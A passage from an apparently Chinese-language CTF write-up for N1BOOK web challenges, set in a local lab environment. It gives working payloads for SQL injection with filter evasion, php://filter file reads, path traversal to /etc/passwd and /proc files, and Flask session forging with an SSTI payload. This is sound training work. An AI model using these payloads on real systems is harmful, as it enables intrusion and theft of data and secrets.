<p>string(154) “You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’123’’’ at line 1”<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_burp_login_request.png" alt="burp login request"></p>
</blockquote>
</li>
<li><p>可能存在报错注入，于是使用 updatexml 函数。继续修改 request 中请求头信息：</p>
<blockquote>
<p><code>name=123&#39;or updatexml(1,concat(0x7e,(select(7,8,9)),0x7e),1)#&amp;pass=123</code></p>
</blockquote>
<p>返回报错内容：string(34) “Operand should contain 1 column(s)”</p>
<p>可能只有1列，尝试 <code>name=123&#39;or updatexml(1,concat(0x7e,(select(7)),0x7e),1)#&amp;pass=123</code></p>
<p>返回报错内容：<code>~7~</code>。确定格式。（0x7e：~ ）</p>
</li>
<li><p>使用完整 SQL 语句测试：<code>name=123&#39;or updatexml(1,concat(0x7e,(select(7) from dual ),0x7e),1)#&amp;pass=123</code>,返回如下 SQL 错误。根据报错信息，说明可能存在关键字的替换，最有可能替换的是 select ,于是使用嵌套 select，即 seselectlect 替换 select，再次成功返回信息<code>~7~</code>。</p>
<blockquote>
<p>string(164) “You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘from dual)),1)#’’ at line 1”</p>
</blockquote>
</li>
<li><p>通过获取表名，列名成功获得 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;test&#39;and updatexml(1,concat(0x7e,(seselectlect group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) ,0x7e),1)#&amp;pass&#x3D;xxxx</span><br><span class="line"></span><br><span class="line">string(34) &quot;XPATH syntax error: &#39;~fl4g,users~&#39;&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;test&#39;and updatexml(1,concat(0x7e,(seselectlect group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;fl4g&#39;),0x7e),1)#&amp;pass&#x3D;xxxx</span><br><span class="line"></span><br><span class="line"># 返回信息：string(28) &quot;XPATH syntax error: &#39;~flag~&#39;&quot;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="1-3-任意文件读取漏洞"><a href="#1-3-任意文件读取漏洞" class="headerlink" title="1.3 任意文件读取漏洞"></a>1.3 任意文件读取漏洞</h2><h3 id="1-3-1-afr-1"><a href="#1-3-1-afr-1" class="headerlink" title="1.3.1 afr_1"></a>1.3.1 afr_1</h3><ol>
<li><p>访问本机 ip(172.19.0.1) 进入环境，发现重定向至了 ?p=hello，联想书中”病者多诡(HCTF 2016)”，很有可能类似，猜测存在 include 函数，p 可能是 page。</p>
</li>
<li><p>使用 wappalyzer 插件获得网站的 Banner 信息，确定是 php。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_afr_1_wappalyzer.png" alt="wappalyzer"></p>
</li>
<li><p>使用 dirsearch 进行目录扫描，发现存在 index.php，且重定向至 ?p=hello</p>
</li>
<li><p>于是尝试访问 <code>http://172.19.0.1/index.php</code>，重定向至了<code>http://172.19.0.1/?p=hello</code>，而访问<code>http://172.19.0.1/?p=index</code>则是报错。</p>
</li>
<li><p>尝试使用 php 的 filter 获取 index.php,<code>http://172.19.0.1/?p=php://filter/read=convert.Base64-encode/resource=index</code>,获得数据<code>PD9waHAKCmlmKGlzc2V0KCRfR0VUWydwJ10pKSB7CiAgICBpbmNsdWRlIChzdHJpbmcpJF9HRVRbJ3AnXSAuICIucGhwIjsKfQplbHNlewogICAgaGVhZGVyKCdMb2NhdGlvbjogLz9wPWhlbGxvJyk7Cn0=</code>，Base64 解码后得</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;p&#39;])) &#123;</span><br><span class="line">  include (string)$_GET[&#39;p&#39;] . &quot;.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  header(&#39;Location: &#x2F;?p&#x3D;hello&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>清楚了逻辑，直接尝试 <code>flag.php</code>,即<code>http://172.19.0.1/?p=php://filter/read=convert.Base64-encode/resource=flag</code>,获得数据<code>PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9</code>，解码得</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">die(&#39;no no no&#39;);</span><br><span class="line">&#x2F;&#x2F;n1book&#123;afr_1_solved&#125;</span><br></pre></td></tr></table></figure>
<p>明显注释中可能表示 flag，查看官方 write up:<code>http://172.19.0.1/?p=php://filter/convert.base64-encode/resource=flag</code>，确定无错。</p>
</li>
<li><p>php://协议 Filter解读： <code>?p=php://filter/read=convert.Base64-encode/resource=flag</code></p>
<ul>
<li>这是 p 关键字得 get 传递，即p=****</li>
<li>php://是一种协议名称，php://filter/ 是一种访问本地文件的协议</li>
<li>read=convert.Base64-encode 表示文件流编码成 Base64 的形式，这样读取的内容就不会存在 PHP 标签</li>
<li>/resource=flag 表示目标文件是 flag.php</li>
</ul>
</li>
</ol>
<h3 id="1-3-2-afr-2"><a href="#1-3-2-afr-2" class="headerlink" title="1.3.2 afr_2"></a>1.3.2 afr_2</h3><ol>
<li><p>访问环境，使用 wappalyzer 插件获得网站的 Banner 信息,发现服务器使用的 Nginx<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_afr_2_wappalyzer.png" alt="wappalyzer"></p>
</li>
<li><p>使用 dirsearch 进行目录扫描，发现<code>/img</code>目录可以直接访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">301   194B   http:&#x2F;&#x2F;172.19.0.1:80&#x2F;img    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;172.19.0.1&#x2F;img&#x2F;</span><br><span class="line">200    99B   http:&#x2F;&#x2F;172.19.0.1:80&#x2F;index.html</span><br></pre></td></tr></table></figure></li>
<li><p>想起 Nginx 错误配置造成的目录穿越漏洞，使用访问路径<code>/img../</code>，获得 flag。</p>
</li>
</ol>
<h3 id="1-3-3-afr-3"><a href="#1-3-3-afr-3" class="headerlink" title="1.3.3 afr_3"></a>1.3.3 afr_3</h3><ul>
<li>【知识点】:<ul>
<li>任意文件读取</li>
<li>flask SSTI 模板注入<ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a></li>
</ul>
</li>
<li>session 伪造<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/DonkeyMoon/article/details/109690476">flask session 伪造</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/109188719">[HCTF 2018]admin 1</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/SopRomeo/article/details/111186821?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&dist_request_id=1328680.24088.16162219708244293&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">N1BOOK 入门session伪造</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<ol>
<li><p><code>172.19.0.1:5000</code> 访问本题环境，在 <code>your name</code>框键入<code>test</code>，点<code>提交</code>。</p>
</li>
<li><p>跳转到了<code>http://172.19.0.1:5000/n1page</code>,并且页面显示：<code>Hello : test, why you don&#39;t look at our article?</code>，点击 <code>article</code> 跳转到了<code>http://172.19.0.1:5000/article?name=article</code></p>
</li>
<li><p>注意到 url 中有参数 name=article,尝试随意赋值 name，页面回显：<code>[Errno 2] No such file or directory: &#39;/home/nu11111111l/articles/article1&#39;</code>，获得路径信息，并且极有可能是 linux 服务器，其实在 wappalyzer 中有检测出是 ubuntu</p>
</li>
<li><p>尝试文件读取漏洞中常见的读取路径。先尝试 <code>/etc/passwd</code>，这个目录保存用户信息及其工作目录的文件,一般呗用作 linux 系统下文件读取漏洞存在性判断的基准。访问<code>http://172.19.0.1:5000/article?name=/../../../etc/passwd</code>,成功回显<code>passwd</code>文件信息。研究了下 linux 的 passwd，没发现特殊的信息，继续尝试其他路径。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash </span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync </span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin </span><br><span class="line">messagebus:x:101:101::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure></li>
<li><p>尝试 <code>/proc/self/cmdline</code>,，即<code>http://172.19.0.1:5000/article?name=/../../../proc/self/cmdline</code>，获得回显信息：<code>pythonserver.py</code>,获得题目是 python 的服务器。</p>
</li>
<li><p>尝试在 <code>environ</code> 查看环境变量，即<code>http://172.19.0.1:5000/article?name=/../../../proc/self/environ</code>,获得环境变量,得知<code>server.py</code> 在 <code>/home/sssssserver</code>路径下。</p>
<blockquote>
<p>HOSTNAME=c0b8f0d6cb78HOME=/rootPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPWD=/home/sssssserver</p>
</blockquote>
</li>
<li><p>直接访问<code>server.py</code>，即<code>http://172.19.0.1:5000/article?name=/../../../home/sssssserver/server.py</code>,成功回显 <code>server.py</code> 源码。（server.py 可以通过<code>/proc/self/cwd</code>进入当前应用所在目录直接获得，即<code>http://172.19.0.1:5000/article?name=/../../../proc/self/cwd/server.py</code>）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (Flask, render_template, request, url_for, redirect, session, render_template_string)</span><br><span class="line"><span class="keyword">from</span> flask_session <span class="keyword">import</span> Session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execfile() 函数可以用来执行一个文件。</span></span><br><span class="line">execfile(<span class="string">&#x27;flag.py&#x27;</span>)</span><br><span class="line">execfile(<span class="string">&#x27;key.py&#x27;</span>)</span><br><span class="line">FLAG = flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在flask项目中，Session, Cookies以及一些第三方扩展都会用到SECRET_KEY值，这是一个比较重要的配置值。</span></span><br><span class="line">app.secret_key = key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问 host/n1page 时会进入此方法</span></span><br><span class="line"><span class="meta">@ app.route(<span class="params"><span class="string">&quot;/n1page&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n1page</span>():</span></span><br><span class="line">	<span class="keyword">if</span> request.method != <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">		<span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line">	n1code = request.form.get(<span class="string">&quot;n1code&quot;</span>) <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 过滤</span></span><br><span class="line">	<span class="keyword">if</span> n1code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">		n1code = n1code.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;n1code&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		session[<span class="string">&#x27;n1code&#x27;</span>] = n1code</span><br><span class="line"></span><br><span class="line">	template = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">		template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">			&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; </span></span><br><span class="line"><span class="string">			&lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; </span></span><br><span class="line"><span class="string">			Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;?</span></span><br><span class="line"><span class="string">			 &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27;</span> % session[<span class="string">&#x27;n1code&#x27;</span>]</span><br><span class="line"></span><br><span class="line">	session[<span class="string">&#x27;n1code&#x27;</span>] = <span class="literal">None</span></span><br><span class="line">	<span class="keyword">return</span> render_template_string(template) @ app.route(<span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&quot;main.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@ app.route(<span class="params"><span class="string">&#x27;/article&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">article</span>():</span></span><br><span class="line">	error = <span class="number">0</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">    	page = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">    	page = <span class="string">&#x27;article&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> page.find(<span class="string">&#x27;flag&#x27;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">		page = <span class="string">&#x27;notallowed.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">    	template = <span class="built_in">open</span>(<span class="string">&#x27;/home/nu11111111l/articles/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(page)).read()</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    	template = e</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, template=template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>在 pycharm 中搭建环境，通过阅读源码知目录下有 <code>flag.py</code>，直接访问发现没有权限。继续阅读源码，发现<code>n1page</code>方法中存在模板注入，但是存在过滤</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> n1code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">	n1code = n1code.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>不过在接下来的对 session[<code>n1code</code>] 仅仅是简单判定是否为空，可以利用 falsk 的 session 伪造实现注入。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; </span></span><br><span class="line"><span class="string">	&lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; </span></span><br><span class="line"><span class="string">	Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;?</span></span><br><span class="line"><span class="string">	 &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27;</span> % session[<span class="string">&#x27;n1code&#x27;</span>]</span><br></pre></td></tr></table></figure></li>
<li><p>首先通过代码的逻辑，程序进入<code>n1page</code>方法，也就是访问<code>host/n1page</code>的时候，所以应该是抓访问<code>http://172.19.0.1:5000/n1page</code>的包。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_afr3_n1page_session.png" alt="afr3"></p>
</li>
<li><p>获取这个包的 session，然后使用解码函数解密，确定 session 字符串形式<code>&#123;&#39;n1code&#39;: None&#125;</code>，需要构造 payload 去替换 none。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">payload</span>):</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 由于我是在 pycharm 运行，为了方便直接将 session 赋值给 payload</span></span><br><span class="line">    payload = <span class="string">&quot;eyJuMWNvZGUiOm51bGx9.YFVHSw.M_DdKDNd7WMbknyVKSDJ9Y25Z7Q&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(decryption(payload.encode()))</span><br><span class="line">    <span class="comment"># print(decryption(sys.argv[1].encode())) </span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>{‘n1code’: None}</p>
</blockquote>
</li>
<li><p>flask的 session 伪造需要一个密钥。接下来需要获得<code>SECRET_KEY</code>。在 server.py 源码中有执行 key.py 文件的操作，即<code>execfile(&#39;key.py&#39;)</code>，所以尝试直接访问<code>key.py</code>，成功获得内容：#!/usr/bin/python key = ‘Drmhze6EPcv0fN_81Bj-nA’</p>
</li>
<li><p>接下来是构造 payload。使用知识点中列的博文里的 payload 很多都失败了，我最终成功的形式：<code>&#123;&#123;[].__class__.__mro__[1].__subclasses__()[40](\'flag.py\').read()&#125;&#125;&#39;&#125;&quot;</code>，使用<code>flask-session-cookie-manager</code>完整的命令形式：<code>python3 flask_session_cookie_manager3.py encode -s &quot;Drmhze6EPcv0fN_81Bj-nA&quot; -t &quot;&#123;&#39;n1code&#39; : &#39;&#123;&#123;[].__class__.__mro__[1].__subclasses__()[40](\'flag.py\').read()&#125;&#125;&#39;&#125;&quot;</code></p>
</li>
</ol>
<ul>
<li>flask-session-cookie-manager：Flask Session Cookie Decoder/Encoder，可以用来对 flask session cookie 编码/解码，实际上第10步也可以用这个来解码</li>
<li><code>Drmhze6EPcv0fN_81Bj-nA</code>，从 key.py 中获得的密钥</li>
<li>整个流程：1. 先对原始 session 解码获得 session 的形式  2. 获取<code>SECRET_KEY</code>  3. 构造 payload  4. 按照解码获得 session 的形式构造 session，再通过<code>flask-session-cookie-manager</code>使用 key 加密编码。</li>
</ul>
<ol start="13">
<li>将<code>flask-session-cookie-manager</code>获得的编码放到请求包的 session 中，再向服务器发送该包，成功获得 flag.py<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_afr_3_flag.png" alt="afr"></li>
</ol>
<h1 id="第二章-Web-进阶"><a href="#第二章-Web-进阶" class="headerlink" title="第二章 Web 进阶"></a>第二章 Web 进阶</h1><h2 id="2-1-SSRF漏洞"><a href="#2-1-SSRF漏洞" class="headerlink" title="2.1 SSRF漏洞"></a>2.1 SSRF漏洞</h2><ol>
<li><p> 进入环境，点击 intersting challenge，代码审计。更详细的代码审计可以看这篇<a target="_blank" rel="noopener" href="https://blog.csdn.net/wuyaowangchuan/article/details/110433971">博客</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 